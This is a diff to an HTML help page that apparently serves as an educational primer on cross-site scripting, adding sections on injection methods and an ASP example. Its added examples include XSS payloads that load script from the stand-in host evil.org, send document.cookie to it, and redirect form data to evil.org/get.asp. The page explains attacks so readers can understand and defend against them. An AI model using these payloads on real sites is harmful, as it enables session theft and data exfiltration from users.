@@ -3,7 +3,7 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>General Primer</title>
-</head><body>Cross-site-scripting, or XSS as it is sometimes abbreviated to, is an attack that let's the attacker execute javascript code in the browser of the victim.<br/>
+</head><body>Cross-site-scripting, or XSS as it is sometimes abbreviated to, is an attack that let's the attacker execute javascript code in the browser of the victim. A cross site scripting attack is typically done with a specially crafted URI that an attacker provides to their victim. In the case of a XSS attack, it allows the attacker to display arbitrary information, and suppress the display of the original webpage. <br/>
 <br/>
 <b>Types of XSS</b><br/>
 <b>Persistent</b>&nbsp;<br/>
@@ -24,5 +24,77 @@ Variation:<br/>
 <br/>
 extra1 &lt;tag spacer1 handler spacer3 = spacer4 code spacer5 extra2&gt; extra3 (without spacer2)<br/>
 <br/>
-Except for the first one, all spacers are optional and usually used for filter evasion. This is also the scheme used by the webGun XSS payload building tool:<br/>
+Except for the first one, all spacers are optional and usually used for filter evasion. This is also the scheme used by the <a href="http://brutelogic.com.br/webgun">webGun XSS payload building tool</a>.<br/>
+<br/>
+<br/>
+<b>Understanding Code Insertion</b><br/>
+To date, security professions have discovered an ever increasing number of methods for potentially embedding code within poorly configured web applications. The following are some of the more common methods for doing so.<br/>
+<br/>
+<b>Inline Scripting</b><br/>
+http://trusted.org/search.cgi?criteria=&lt;script&gt;code&lt;/script&gt;<br/>
+http://trusted.org/search.cgi?val=&lt;SCRIPT SRC='http://evil.org/badkama.js'&gt; &lt;/SCRIPT&gt;<br/>
+http://trusted.org/COM2.IMG%20src= "Javascript:alert(document.domain)"<br/>
+<br/>
+<b>Forced Error Responses</b><br/>
+http://trusted.org/&lt;script&gt;code&lt;/script&gt; <br/>
+This insertion facet usually occurs due to poor error handling by the web server or application component. The application fails to find the requested page and reports an error which unfortunately includes the unprocessed script data.<br/>
+<br/>
+http://trusted.org/search.cgi?blahblahblahblahblah&lt;script&gt;code&lt;/script&gt; <br/>
+If a Java application such as a servlet fails to handle an error gracefully, and allows stack traces to be sent to the users browser, an attacker can construct a URL that will throw an exception and add his malicious script to the end of the request.<br/>
+<br/>
+http://trusted.og/servlet/ org.apache.catalina.servlets.WebdavStatus/&lt;script&gt;code&lt;/script&gt; <br/>
+In the example above, when the Tomcat servlet is called with the training illegitimate request, an error page is served containing the offending text verbatim.<br/>
+<br/>
+Non &lt;SCRIPT&gt; Events<br/>
+" [event]='code' <br/>
+In many cases it may be possible for an attacker to insert an exploit string, with the above syntax, into a HTML tag that should have been like:<br/>
+<br/>
+&lt;A HREF="exploit string"&gt;Go&lt;/A&gt; <br/>
+resulting in: <br/>
+&lt;A HREF="" [event]='code'"&gt;Go&lt;/A&gt;<br/>
+<br/>
+&lt;b onMouseOver="self.location.href='http://evil.org/'"&gt;bolded text&lt;/b&gt; <br/>
+As the client cursor moves over the bolded text, an intrinsic event occurs and the JavaScript code is executed.<br/>
+<br/>
+<b>JavaScript Entities</b><br/>
+&lt;img src="&amp;{alert('CSS Vulnerable')};"&gt; <br/>
+The special character “&amp;” is sometimes interpreted as a new JavaScript code segment (entity).<br/>
+<br/>
+<b>Typical Payloads Formatting</b><br/>
+&lt;img src = "malicious.js"&gt;<br/>
+&lt;script&gt;alert('hacked')&lt;/script&gt;<br/>
+&lt;iframe = "malicious.js"&gt;<br/>
+&lt;script&gt;document.write('&lt;img src="http://evil.org/'+document.cookie+'") &lt;/script&gt;<br/>
+&lt;a href="javascript:…"&gt;click-me&lt;/a&gt;<br/>
+<br/>
+<b>Insertion Example<br/>
+</b><b>Dynamic URL Generation</b><br/>
+Consider an application built for running on Microsoft’s Internet Information Server (IIS) web server platform. Dynamic content is delivered through IIS’s Active Server Pages (ASP). <br/>
+Within the sample page, a dynamically built HTML tag for refining search parameters is constructed as follows: <br/>
+&lt;A HREF="http://trusted.org/search_main.asp? searchstring=SomeString"&gt;click-me&lt;/A&gt; <br/>
+and the ASP code required to generate a further query based upon this submitted information is:<br/>
+<br/>
+&lt;% <br/>
+var BaserUrl = "http://trusted.org/search2.asp? <br/>
+searchagain=";Response.Write("&lt;a href=\"" + BaseUrl <br/>
++ Request.QueryString("SearchString") + "\"&gt;click-me&lt;/a&gt;" ) <br/>
+%&gt;<br/>
+<br/>
+If the attacker was to replace the “SomeString” with their own code, as indicated next: <br/>
+&lt;a href="http://trusted.org/search_main.asp? <br/>
+SearchString=%22+onmouoseover%3D%27ClientForm% <br/>
+2Eaction%3D%22evil%2Eorg%2Fget%2Easp%3FData% <br/>
+3D%22+%2B+ClientForm%2EPersonalData%3BClientForm% <br/>
+2Esubmit%3B%27"&gt;FooBar&lt;/a&gt;<br/>
+<br/>
+The likely result found in the dynamically generated ASP page will be: <br/>
+&lt;A HREF="http://trusted.org/search2.asp? <br/>
+searchagain="" onmouoseover='ClientForm. <br/>
+action="evil.org/get.asp?Data=" + <br/>
+ClientForm.PersonalData;ClientForm. <br/>
+submit;'"&gt;click-me&lt;/A&gt;<br/>
+<br/>
+In this case, the attacker has added to the HTML page code, and used the DOM of the HTML page to redirect data in some form to the attacker’s web site.<br/>
+<br/>
+<br/>
 </body></html>
